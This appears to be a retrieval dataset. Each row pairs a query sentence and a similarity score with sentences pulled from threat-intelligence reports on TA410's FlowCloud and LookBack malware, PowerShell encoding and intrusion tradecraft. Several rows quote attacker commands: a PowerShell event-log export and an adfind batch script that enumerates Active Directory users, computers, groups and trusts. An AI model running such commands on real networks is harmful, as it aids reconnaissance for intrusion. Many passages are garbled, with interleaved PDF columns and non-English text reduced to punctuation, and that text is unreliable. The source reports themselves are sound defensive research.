Internet service providers in Asia and both access to the network routers Australia.', 'of several operators as well as pre- prepared scenarios for manipulating traffic.']
network configuration|0.782785664482021|['It uses at-issue class method that PMapper stores data about AWS accounts and JndiLookup lookup() 6 2021 NCC Group Annual Research ReportDynamic Virtual Channel that enables us to communicate We also released source code for a variety optimizations found in pairing-based cryptography, over an open RDP/Citrix connection without the need to of cryptographic implementations, exploit foundational to the BLS Signatures central to Ethereum open a new socket, connection or a port on a firewall.', '2.0, zero-knowledge arguments central to Zcash, Filecoin, proofs-of-concept, and obfuscation The author, Balazs Bucsay, presented the tool at the and other blockchain/cryptocurrency projects relying reverse-engineering techniques: Cyber Security Global Summit by Geekle.', 'upon zk-proofs.', 'In January 2021, Jeff Dileo released proof-of-concept Solitude: Solitude is an open source privacy analysis In October 2021, Thomas Pornin implemented a exploit code for his vulnerability, CVE-2020-15257, found tool that enables you to conduct your own privacy mathematically-impossible lossless compression in containerd - a container runtime underpinning Docker investigations into where your private data goes once it algorithm, alongside a blog post titled Paradoxical and common Kubernetes configurations - which resulted leaves your web browser or mobile device.', 'Whether a Compression with Verifiable Delay Functions, and in full root container escape for a common container curious novice or a more advanced researcher, Solitude released a paper on the IACR ePrint archive.', 'configuration.', 'This was discussed in depth in his blog makes the process of evaluating an apps privacy accessible for everyone, created by Dan Hastings.', 'post titled, A BSTRACT SHIMMER (CVE-2020-15257): In October 2021, Nicolas Guigo released tools and Solitude was featured in media outlets including KitPloit, Host Networking is root-Equivalent, Again.', 'methods for reversing real-world binary obfuscation, Hacking Land, and Hacking Reviews.', 'through a blog post titled A Look At Some Real-World In January 2021, Thomas Pornin published a blog post Obfuscation Techniques.', 'on Double-odd Elliptic Curves, which discussed some Squeak: The tool was described in their blog post, MSSQL Lateral Movement, created by David Cash.']
This was double base64 encoded.|0.8570731680730078|['The exploitation method used in this campaign relies upon a remote Office template injection method, a technique that we have seen state actors use recently.', 'However, it is not uncommon to use tools such as EvilClippy to manipulate the behavior of Microsoft Office documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and effort.', 'This method will generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embedded into the documents (i.e.', 'double base64 encoded payload).', 'Further mapping these techniques across the MITRE ATT&CK framework enables us to visualize different techniques the adversary used to exploit their victims.', 'MITRE ATT&CK mapping for malicious documents These Microsoft Office templates are hosted on a command and control server and the downloaded link is embedded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-22 Fighter Jet Program Defense, Space and Security (DSS) Photovoltaics for space solar cells Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Engineer System Engineer Professional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recommendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the attack in the early stages.']
This was double base64 encoded.|0.8570731680730078|['These job descriptions are legitimate and taken directly from the defense contractors website.', 'The exploitation method used in this campaign relies upon a remote Office template injection method, a technique that we have seen state actors use recently.However, it is not uncommon to use tools such as EvilClippy to manipulate the behavior of Microsoft Office documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and effort.', 'This method will generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embedded into the documents (i.e.', 'double base64 encoded payload).', 'Further mapping these techniques across the MITRE ATT&CK framework enables us to visualize different techniques the adversary used to exploit their victims.MITRE ATT&CK mapping for malicious documentsThese Microsoft Office templates are hosted on a command and control server and the downloaded link is embedded in the first stage malicious document.The job postings from these lure documents are positions for work with specific US defense programs and groups:F-22 Fighter Jet ProgramDefense, Space and Security (DSS)Photovoltaics for space solar cellsAeronautics Integrated Fighter GroupMilitary aircraft modernization programsLike previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed:Senior Design EngineerSystem EngineerProfessional networks such as LinkedIn could be a place used to deliver these types of job descriptions.Defensive Architecture RecommendationsDefeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the attack in the early stages.', 'The key controls in this case would include the following:Threat Intelligence Research and Response Program.', 'Its critical to keep up with the latest Adversary Campaigns targeting your specific vertical.', 'A robust threat response process can then ensure that controls are adaptable to the TTPs and, in this case, create heightened awarenessSecurity Awareness and Readiness Program.The attackers leveraged spear-phishing with well-crafted lures that would be very difficult to detect initially by protective technology.']
"PowerShell Base64 encoded string:

The -e is short for -EncodedCommand."|0.7959471375481109|"[']117.In addition, the threat actors also used Internet Explorer on the domain controller to search Bing.This is quite unusual to search directly on the victims browser.', 'The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.Share discovery with Invoke-ShareFinderOther tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets.', 'We havea detailed report covering Invoke-ShareFinder.', 'In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:Windows Security Logs discoveryOnce the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.C:\\\\Windows\\\\system32\\\\cmd.exe /C powershell -c ""get-eventlog \'Security\' | where {$_.Message -like \'*<REDACTED>*\' -AND \'Source Network Address\'} | export-csv c:\\\\windows\\\\temp\\\\events_<REDACTED>.txt""Executing this query would return all events in the Security log that references the specified account and with a source network address.', 'Events returned would include process creation, logins, etc.Its likely that this discovery technique forms an extension of T1033 System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.Base64 for the winOther discovery activities observed included a domain host discovery script via PowerShell.', 'This was double base64 encoded.Decoding this revealed another PowerShell Base64 encoded string:The -e is short for -EncodedCommand.', 'The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.', 'Refer to the Base64 cheatsheet by Forian Rothhere.There are many different variations of EncodedCommand, with shorthand and aliases available.', 'Unit42 (PaloAlto) provides agood articleon trends and observations of PowerShell encoded commands:Decoding this again using CyberChef shows the resulting PowerShell script:More tools dropped by threat actorsOther binaries and scripts were dropped onto one endpoint:The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.ADGetAn Active Directory collection tool named ADGet was dropped into a users temp folder and executed with an output filename argument.', 'No file meta data is provided.', 'Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.ADGet is an uncommon tool, however, its function is very similar to ADfindthe key difference is that LDAP queries are not passed, they are instead coded into the binary itself.The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:These files can be viewed with any editor or reader that supports CSV or TSV.AdFindWhile Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.The AD.bat file had the following commands:for /f ""delims="" %%A in (\'dir /s /b %WINDIR%\\\\system32\\\\*htable.xsl\') do set ""var=%%A"" adfind.exe -f (objectcategory=person) > ad_users.txt adfind.exe -f objectcategory=computer > ad_computers.txt adfind.exe -f objectcategory=computer -csv name operatingSystem > ad_computers_enum.txt adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt adfind.exe -f ""(objectcategory=group)"" > ad_group.txt adfind.exe -gcb -sc trustdmp > ad_trustdmp.txtInterestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\\\\windows\\\\system32\\\\wbem\\\\en-US\\\\htable.xsl).']"
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $|1.0000000000000002|"['The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.Share discovery with Invoke-ShareFinderOther tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets.', 'We havea detailed report covering Invoke-ShareFinder.', 'In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:Windows Security Logs discoveryOnce the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.C:\\\\Windows\\\\system32\\\\cmd.exe /C powershell -c ""get-eventlog \'Security\' | where {$_.Message -like \'*<REDACTED>*\' -AND \'Source Network Address\'} | export-csv c:\\\\windows\\\\temp\\\\events_<REDACTED>.txt""Executing this query would return all events in the Security log that references the specified account and with a source network address.', 'Events returned would include process creation, logins, etc.Its likely that this discovery technique forms an extension of T1033 System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.Base64 for the winOther discovery activities observed included a domain host discovery script via PowerShell.', 'This was double base64 encoded.Decoding this revealed another PowerShell Base64 encoded string:The -e is short for -EncodedCommand.', 'The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $.', 'Refer to the Base64 cheatsheet by Forian Rothhere.There are many different variations of EncodedCommand, with shorthand and aliases available.', 'Unit42 (PaloAlto) provides agood articleon trends and observations of PowerShell encoded commands:Decoding this again using CyberChef shows the resulting PowerShell script:More tools dropped by threat actorsOther binaries and scripts were dropped onto one endpoint:The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.ADGetAn Active Directory collection tool named ADGet was dropped into a users temp folder and executed with an output filename argument.', 'No file meta data is provided.', 'Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.ADGet is an uncommon tool, however, its function is very similar to ADfindthe key difference is that LDAP queries are not passed, they are instead coded into the binary itself.The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:These files can be viewed with any editor or reader that supports CSV or TSV.AdFindWhile Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.The AD.bat file had the following commands:for /f ""delims="" %%A in (\'dir /s /b %WINDIR%\\\\system32\\\\*htable.xsl\') do set ""var=%%A"" adfind.exe -f (objectcategory=person) > ad_users.txt adfind.exe -f objectcategory=computer > ad_computers.txt adfind.exe -f objectcategory=computer -csv name operatingSystem > ad_computers_enum.txt adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt adfind.exe -f ""(objectcategory=group)"" > ad_group.txt adfind.exe -gcb -sc trustdmp > ad_trustdmp.txtInterestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\\\\windows\\\\system32\\\\wbem\\\\en-US\\\\htable.xsl).', 'The HTML was never used.']"
files were then deleted|0.7984454081322363|"['Save web pages as PDF with PDFmyURLPS: Did you see what domains that was used?', ';) Hmm, okay, good, now we know exactly who is behind this attack.. #MalwareMustDie!', 'Save web pages as PDF with PDFmyURLWed Mar 15 01:17:48 JST 2017 @unixfreaxjp / MalwareMustDie,NPO - Reversed and published the report Thu Mar 15 05:42:14 JST 2017 @luffy(credit) corrected some Japanese wording in documentation.', '(thank you) Fri Mar 17 00:48:30 JST 2017 @elkentaro translated the whole documents into English PS: I might update this later with more material.', '0 : ... : Google   : (Atom) #OCJP-098 285Darkleech Apache ModuleIEBlackhole 285Darkleech Apache ModuleInternet ExplorerBlackhole PDF/Java/... Save web pages as PDF with PDFmyURLbash 0dayreal time  CVE-2014-6271bash 0day24 MalwareMustDie... Linux/Mayhem Linux/Mayhem wordpress wordpressbrute ... #OCJP-128:  0day.jp Kelihos  MalwareMustDie12IP1... (c) 2017, ZeroDay Japan | http://blog.0day.jp |.', '.', 'Powered by Blogger.', 'Save web pages as PDF with PDFmyURL']"
using PowerShell.|0.8139123809618605|"[',  (Kill Switch)      .', ',    (Kill Switch) .', '01.', '(Fileless)      .', '(1) (FILELESS)     v2.1, v2.1( ver- sion=3.0.0), v3.0  .', '.', 'ASEC REPORT Vol.91 | Security Trend 41-1) v2.1 4 ,     v2.1  .', '(Magnitude)   ,  [ 1-1] .', '1-1 | v2.1     ,   mshta.exe, rundll32.', 'exe, WMIC.exe  URL .', '.']"
using PowerShell.|0.8139123809618605|"[""cert.gov.ua /article/5213167  Turla (UAC-0024, UAC-0003)   CAPIBAR KAZUAR (CERT-UA#6981)    '  CERT-UA   ."", ', 2022  UAC-0024 ,   ,      CAPIBAR (Microsoft: ""DeliveryCheck"", Mandiant: ""GAMEDAY"").', 'XSLT (Extensible Stylesheet Language Transformations) COM-hijacking CAPIBAR   , , ,   MS Exchange  MOF (Managed Object Format)  PowerShell- Desired State Configuration (DCS),     .', ',      ,   (,   ),    ,  PowerShell.', ',      KAZUAR,   40 , : ""chakra"" ( JS  ChakraCore), ""eventlog"" (  ), ""forensic"" ( : compatibilityassistant, exploreruserassist, activitiescache, prefetchfiles, muicache), ""steal"" ( : passwords, bookmarks, autofill, history, proxies, cookies, filezilla, chromium, mozilla, outlook, openvpn, system, winscp, signal, git), ""unattend"" ( / : KeePass, Azure, Gcloud, AWS, bluemix ).', 'rclone.', ',  ,   KAZUAR,    (UAC-0024)  Turla (UAC-0003, KRYPTON, Secret Blizzard),   .', ',   - .', 'Microsoft Threat Intelligence (@MsftSecIntel)      .']"
using PowerShell.|0.8139123809618605|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
Controlling attached camera devices to take pictures of the compromised computer’s surroundings.|0.9353429082119393|['TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021.', 'ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT.', 'It has several interesting capabilities, including: Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.', 'Monitoring clipboard events to steal clipboard content.', 'Monitoring file system events to collect new and modified files.', 'Controlling attached camera devices to take pictures of the compromised computers surroundings.', 'FlowCloud deploys a rootkit to hide its activity on the compromised machine.', 'The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.', 'The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.']
can periodically take screenshots and store them with information about the foreground process and time since the last user input|0.9346514376336117|['As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.', 'This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.', 'Figure 15.', 'Set up monitoring of the clipboard Collected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.', 'FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things happening around the victims computer.']
can periodically take screenshots and store them with information about the foreground process and time since the last user input|0.7879493100654916|['To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.', 'The obtained information is correlated with data from theWin32_Processtable for a more detailed view.User activityFlowCloud is able collect a miscellany of data that we have decided to group under the User activity umbrella.It has the ability to monitor the clipboard for changes and save any data it contains.', 'As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.', 'This window usesAddClipboardFormatListener(on Windows Vista or more recent) orSetClipboardViewer(on Windows XP and prior) to listen for clipboard content changes.Figure 15.', 'Set up monitoring of the clipboardCollected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the\\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_englishnamed pipe.Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using theCCameraDSclass from OpenCV.The second way it can collect information about the computers surroundings is by recording audio.']
To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.|0.88756968163371|['This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.', 'Figure 15.', 'Set up monitoring of the clipboard Collected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.', 'FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.']
To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.|0.88756968163371|['The obtained information is correlated with data from theWin32_Processtable for a more detailed view.User activityFlowCloud is able collect a miscellany of data that we have decided to group under the User activity umbrella.It has the ability to monitor the clipboard for changes and save any data it contains.', 'As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.', 'This window usesAddClipboardFormatListener(on Windows Vista or more recent) orSetClipboardViewer(on Windows XP and prior) to listen for clipboard content changes.Figure 15.', 'Set up monitoring of the clipboardCollected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the\\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_englishnamed pipe.Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using theCCameraDSclass from OpenCV.The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by thedecibel_limitfield of theaudio_policy.']
can communicate over HTTP or via its “normal protocol”.|0.8294112870459365|['If this file is unavailable or invalid, a hardcoded default configuration is used.', 'A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.', 'The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.', 'Communication protocol LookBack can communicate over HTTP or via its normal protocol.', 'In either case, the data being transferred is the same.', 'LookBacks normal protocol uses raw TCP sockets and a custom message format described in Table 4.', 'This message is composed of eight header fields, followed by a body of variable length.', 'The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20).', 'The encrypted data is then compressed with the deflate algorithm via the compress function of the statically linked zlib.']
The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP|0.8332309650478998|['9 Server Reply to message type 8.', 'The message body contains the SodomMain file.', '36 and 38 Client Transfer file to server in message body.', '35 and 37 Server Response to message 36 or 38.', '41 Client Request file from server.', '42 Server Transfer file to client in message body (response to message 41) The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP.', 'It uses a pair of hardcoded templates, one for client requests and another for server responses.', 'The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.', 'For client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a-p instead of the conventional 0-9a-f.', 'This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an application/x-www-form- urlencoded message.', 'The requests body is composed of this encoded value prefixed with the hardcoded string id=1&op=report&status=.']
can communicate over raw TCP sockets.|0.8688933864165331|['23/27Screenshot of Figure 25.', 'Performing a POST and sending information to the C2 address.', 'Figure 25.', 'Performing a POST and sending information to the C2 address.', 'The actions performed by the RAT use a distinctive user-agent string, cpp-httplib/0.7, making it stand out in traffic.', 'It can communicate over TCP using raw sockets or via HTTP.', 'The RAT can also perform other, less common HTTP verb-related operations, such as PUT and PATCH.', '24/27Screenshot of Figure 26.', 'Code matching the PCAP items from Figures 24 and 25.', 'Figure 26.', 'Code matching the PCAP items from Figures 24 and 25.']
we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products|0.8738103729424748|['FlowCloud deploys a rootkit to hide its activity on the compromised machine.', 'The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.', 'The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.', 'However, we 1/26found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.', 'In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value.', 'Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.', 'This information can help attackers understand stolen data by contextualizing it.', 'FlowCloud can also gather information about things happening around the victims computer by taking pictures using connected camera peripherals and recording audio using a computers microphone.', 'This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume.']
there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.|0.9940605470479663|['FlowCloud deploys a rootkit to hide its activity on the compromised machine.', 'The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.', 'The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.', 'However, we 1/26found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.', 'In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value.', 'Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.', 'This information can help attackers understand stolen data by contextualizing it.', 'FlowCloud can also gather information about things happening around the victims computer by taking pictures using connected camera peripherals and recording audio using a computers microphone.', 'This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume.']
there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.|0.8893062602917602|"['A year later, the then-new and very complex malware family calledFlowCloudwas also attributed to TA410.In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET.', 'This very complex backdoor contains interesting espionage capabilities.', 'ESET will present its latest findings about TA410, including results from ongoing research, duringBotconf 2022.', ""For YARA and Snort rules, consultESET's GitHub account.Key points in this blogpost:TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog,Decrypt and inject shellcode and JollyFrog, each with its own toolset and targets.ESET telemetry shows victims all around the world, mainly in the governmental and education sectors.TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g.,ProxyLogonin March 2021 andProxyShellin August 2021.ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT."", 'It has several interesting capabilities, including:Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.Monitoring clipboard events to steal clipboard content.Monitoring file system events to collect new and modified files.Controlling attached camera devices to take pictures of the compromised computers surroundings.FlowCloud deploys a rootkit to hide its activity on the compromised machine.The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications.TA410 is one of the users of the Royal Road malicious document builder.TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.', 'However, we found a customAntivirusCheckclass, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.', 'In case one of these products is detected, FlowCloud goes through its regular loading process and cancels theauto_start_after_installconfiguration value.Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.', 'This information can help attackers understand stolen data by contextualizing it.FlowCloud can also gather information about things happening around the victims computer by taking pictures using connected camera peripherals and recording audio using a computers microphone.', 'This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume.AttributionESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts.', 'These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology, and network infrastructure.FlowingFrogusesRoyal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud.LookingFroguses a first-stage backdoor called X4, and LookBack as a second stage.JollyFroguses only generic malware families such as Korplug (aka PlugX) and QuasarRAT.', 'Part of the activity of this team was described byFortinet, who attributed the activity to APT10.']"
It checks running processes for executables of several known cybersecurity vendors.|1.0|['The previously mentioned NetTask already accomplishes persistence in most cases, by executing on system startup.', 'This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled.', 'On systems where either of those is disabled, this module does nothing.', 'FlowCloud v4.1.3 This older version of FlowCloud has already been described in a Proofpoint blogpost and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.', 'This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed.', 'It checks running processes for executables of several known cybersecurity vendors.', 'While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.', 'This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.', 'It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.', 'This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.', 'Interestingly, the driver installed is the same as the one for version 5.0.2.']
It checks running processes for executables of several known cybersecurity vendors.|1.0|['Function used to prevent a process from being displayed in lists of running processesThrough its hijacking of the network driver, the rootkit can also hide a single processs network traffic from local utilities.', 'The process whose traffic is to be hidden is set through theIOCTL_SET_TRAFFICHIDE_PROCESSID(0x222048) control code.Some of the rootkits functions are used by thefcClientDllmodule to hide the process in which it is running.Control codes to manipulate a process name in various internal structures are also exposed by the driver.Persistence module (fcClientWD)This module is relatively simple compared to other components.', 'The previously mentionedNetTaskalready accomplishes persistence in most cases, by executing on system startup.', 'This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled.', 'On systems where either of those is disabled, this module does nothing.FlowCloud v4.1.3This older version of FlowCloud has already been described in aProofpoint blogpostand presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed.', 'It checks running processes for executables of several known cybersecurity vendors.', 'While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.', 'This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.It also embeds a DLL version of thePafish(aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.', 'This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.Interestingly, the driver installed is the same as the one for version 5.0.2.', 'Those used by version 5.0.3 provide identical functionality, but differ slightly.TA410 LookingFrogLookingFrog uses two main malware families: X4 and LookBack.', 'We have seen both of them on machines belonging to the same victim.X4X4 is a custom backdoor that is used as a first stage, before LookBack is deployed.']
